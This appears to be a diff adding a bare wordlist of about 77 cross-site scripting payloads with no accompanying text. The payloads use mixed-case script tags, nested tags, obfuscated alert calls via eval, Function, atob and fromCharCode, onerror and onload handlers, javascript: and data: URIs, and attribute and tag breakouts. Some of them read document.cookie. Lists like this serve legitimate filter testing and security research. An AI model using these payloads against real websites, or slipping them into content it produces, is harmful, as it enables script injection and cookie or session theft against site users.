@@ -1,0 +1,78 @@
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(atob('MQ=='))</script>
+<script>window['al'+'ert'](1)</script>
+<script>this['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>frames[0]?.alert?.(1)</script>
+<script>Function('al'+'ert(1)')()</script>
+<script>eval('al'+'ert(1)')</script>
+<script>setTimeout('alert(1)',1)</script>
+<script>setInterval('alert(1)',1)</script>
+<script>alert(1/**/)</script>
+<script>/*xss*/alert(1)</script>
+<script>/**/alert(1)</script>
+<script>//xss
+alert(1)</script>
+<svg oNLoAd=alert(1)>
+<svg/onload=window['alert'](1)>
+<svg><script>top['alert'](1)</script></svg>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=top['alert'](1)>
+<img src=x onerror=self['alert'](1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert?.(1)>
+<img src=x onerror=(alert)(1)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=location='javascript:alert(1)'>
+<img src=x onerror=alert(String.raw`xss`)>
+<img src=x onerror=alert(/xss/.source)>
+<img src=x onerror=alert([1,2,3].join())>
+<img src=x onerror=alert('xss'.toUpperCase())>
+<img src=x onerror=alert(document['domain'])>
+<img src=x onerror=alert(document['cookie'])>
+<img src=x onerror=alert(window.location.href)>
+<img src=x onerror=alert(String.fromCharCode(49))>
+<img src=x onerror=alert(atob('MQ=='))>
+<a href="JaVaScRiPt:alert(1)">click</a>
+<a href="jAvAsCrIpT:confirm(1)">click</a>
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+javascript:window['alert'](1)
+javascript:top['alert'](1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+"><img src=x onerror=window['alert'](1)>
+'><img src=x onerror=window['alert'](1)>
+"><body onload=window['alert'](1)>
+'><body onload=window['alert'](1)>
+" onmouseover=window['alert'](1) x="
+' onmouseover=window['alert'](1) x='
+" autofocus onfocus=window['alert'](1) x="
+' autofocus onfocus=window['alert'](1) x='
+" onclick=window['alert'](1) x="
+' onclick=window['alert'](1) x='
+" style=animation-name:x onanimationstart=alert(1) x="
+' style=animation-name:x onanimationstart=alert(1) x='
+"/><svg/onload=alert(1)>
+'/><svg/onload=alert(1)>
+"/><img src=x onerror=alert(1)>
+'/><img src=x onerror=alert(1)>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+<iframe srcdoc='<svg/onload=alert(1)>'></iframe>
+<meta http-equiv=refresh content="0;url=JaVaScRiPt:alert(1)">
+<base href="JaVaScRiPt:alert(1);//">
+<object data=JaVaScRiPt:alert(1)>
+<embed src=JaVaScRiPt:alert(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>
+</title><svg/onload=alert(1)>
+</textarea><svg/onload=alert(1)>
+</style><svg/onload=alert(1)>
+<!--><svg/onload=alert(1)>
+<script src=data:,alert(1)></script>
+<script>window[atob('YWxlcnQ=')](1)</script>
